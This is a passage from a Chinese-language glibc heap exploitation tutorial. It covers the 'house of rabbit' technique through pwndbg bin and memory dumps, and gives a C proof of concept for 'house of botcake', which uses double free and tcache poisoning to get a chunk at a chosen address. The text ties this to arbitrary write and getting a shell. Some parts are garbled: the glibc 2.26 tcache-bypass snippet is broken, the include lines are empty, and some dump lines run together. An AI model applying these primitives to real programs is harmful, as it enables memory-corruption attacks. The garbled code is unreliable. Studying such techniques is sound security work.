    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    pwndbg> x/30xg 0x603020-0x20
    0x603000:   0x0000000000000000  0x0000000000000021
    0x603010:   0x00000000006020f0  0x0000000000000000  bins 
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x6020f0 (gbuf+16) —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6020f0
    smallbins
    empty
    largebins
    empty
    pwndbg> x/30xg 0x603020-0x20
    0x603000:   0x0000000000000000  0x0000000000a21001  heap
    0x603000 PREV_INUSE {
      prev_size = 0, 
      size = 10485777, 
      fd = 0x6020f0 , 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0xa20fe1
    }
    0x1003010 PREV_INUSE {
      prev_size = 0, 
      size = 135153, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    pwndbg> bins 
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    0x80000: 0x6020f0 (gbuf+16) —▸ 0x7ffff7dd2348 (main_arena+2088) ◂— 0x6020f0
    pwndbg> x/30xg 0x603020-0x20
    0x603000:   0x0000000000000000  0x0000000000a00011
    0x603010:   0x00000000006020f0  0x0000000000000000
    0x603020:   0x0000000000000000  0x0000000000a20fe1
    0x603030:   0x0000000000000000  0x0000000000000000
    0x603040:   0x0000000000000000  0x0000000000000000
    0x603050:   0x0000000000000000  0x0000000000000000
    0x603060:   0x0000000000000000  0x0000000000000000
    0x603070:   0x0000000000000000  0x0000000000000000
    0x603080:   0x0000000000000000  0x0000000000000000
    0x603090:   0x0000000000000000  0x0000000000000000
    0x6030a0:   0x0000000000000000  0x0000000000000000
    0x6030b0:   0x0000000000000000  0x0000000000a20f51
    0x6030c0:   0x0000000000000000  0x0000000000000000
    0x6030d0:   0x0000000000000000  0x0000000000000000
    0x6030e0:   0x0000000000000000  0x0000000000000000
    0x6020d0 :  0x00007ffff7dd18e0  0x0000000000000000
    0x6020e0 :    0xfffffffffffffff0  0x0000000000000010
    0x6020f0 : 0x0000000000000000  0xfffffffffffffff1 : 0x00007ffff7dd2348  0x00007ffff7dd2348
    0x602110 : 0x00000000006020f0  0x00000000006020f0
    0x602120:   0x0000000000000000  0x0000000000000000
    0x602130:   0x0000000000000000  0x0000000000000000
    0x602140:   0x0000000000000000  0x0000000000000000
    0x602150:   0x0000000000000000  0x0000000000000000
    0x602160:   0x0000000000000000  0x0000000000000000
#### 7 覆写可控内存，达到内存任意写
    malloc((void*)&target-(void*)(gbuf+2)-0x20);
    victim = malloc(0x10);
    strcpy(victim, "Hacked!!");
    pwndbg> x/20xg 0x602080-0x10
    0x602070:   0x0000000000000000  0x0000000000000021
    0x602080 :  0x212164656b636148  0x00007ffff7dd1b00
    0x602090 :   0x0000000000000000  0x0000000000000051
    0x6020a0 :   0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x6020b0:   0x0000000000000000  0x0000000000000000
    0x6020c0 : 0x00007ffff7dd2620  0x0000000000000000
    0x6020d0 :  0x00007ffff7dd18e0  0x0000000000000000
    0x6020e0 :    0x0000000000000050  0x0000000000000010
    0x6020f0 : 0x0000000000000000  0xffffffffffffff81
    0x602100 : 0x00007ffff7dd2348  0x00007ffff7dd2348
### Glibc 2.26
从Glibc2.26开始加入了tcache，可通过以下代码绕过
    void evict_tcache(size_t size){
        void *p;
    #if defined(GLIBC_VERSION) && (GLIBC_VERSION >= 26)
        p = malloc(size);
    #if (GLIBC_VERSION > 4) - 2] = 0xff;
    #endif
    #endif
    }
### 利用思路
house of rabbit漏洞可以绕过堆块的地址随机化保护（ASLR）达到 **任意** 地址分配的效果，因此在存在sh的文件中可直接getshell。
## House_of_botcake
### 原理
house of botcake利用手法只需要程序存在double free即可。
首先填充 tcache bin 链表，然后使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk
加入tcache bin链表，然后利用堆块重叠将double free块的fd指针覆写为目标位置，再次malloc即可控制到目标位置，达到任意写操作。
### Poc
    #include 
    #include 
    #include 
    #include 
    int main()
    {
        puts("House of botcake Poc\n\n");
        //禁用缓冲并使_FILE_IO不影响堆
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
        // 准备目标
        intptr_t stack_var[4];
        printf("目标地址是 %p.\n\n", stack_var);
        puts("堆布局构造");
        puts("申请7个 chunks(malloc(0x100)) 用于稍后填充tcache bin链表.");
        intptr_t *x[7];
        for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
            x[i] = malloc(0x100);
        }
        puts("为之后的合并申请一个 prev chunk");
        intptr_t *prev = malloc(0x100);
        puts("申请用于double free的 victim chunk.");
        intptr_t *a = malloc(0x100);
        printf("malloc(0x100): a=%p.\n", a); 
        puts("申请一个填充chunk防止top chunk合并.\n");
        malloc(0x10);
        puts("接下来可以造成堆块重叠");
        puts("Step 1: 填充 tcache bin 链表");
        for(int i=0; i<7; i++){
            free(x[i]);
        }
        puts("Step 2: free victim chunk 并链接到 unsorted bin");
        free(a);
        puts("Step 3: free prev chunk 使它和 victim chunk 合并.");
        free(prev);
        puts("Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表\n");
        malloc(0x100);
        free(a);
        puts("double free 利用完成\n\n");
        puts("tcache 毒化");
        puts("现在 victim chunk 被包含在一个更大的已释放块中，可以通过利用块重叠进行 tcache 毒化");
        intptr_t *b = malloc(0x120);
        puts("将 victim chunk 的 fd 指针覆写为目标位置");
        b[0x120/8-2] = (long)stack_var;
        puts("malloc申请到目标位置.");
        malloc(0x100);
        intptr_t *c = malloc(0x100);
        printf("新申请的 chunk 位于 %p\n", c);
        assert(c==stack_var);
        printf("已控制目标位置!\n\n");